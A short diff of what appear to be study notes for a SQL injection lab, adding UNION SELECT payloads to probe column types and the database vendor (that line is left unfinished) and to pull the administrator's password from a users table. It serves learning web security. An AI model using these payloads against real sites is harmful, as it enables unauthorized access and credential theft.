@@ -192,7 +192,10 @@ GIVEN : The database contains a different table called users, with columns calle
       'UNION SELECT NULL,NULL --+
 
       -FIND THE DATA TYPE OF COLUMNS
-      'UNION SELECT 'abc','def' --+
+      'UNION SELECT NULL,'abc' --+
+
+      -FIND THE DB VENDOR 
+       'UNION SELECT 
 
       -FIND THE PASSWORD 
       'UNION SELECT 'ABC',password from users where sername='administrator' --+
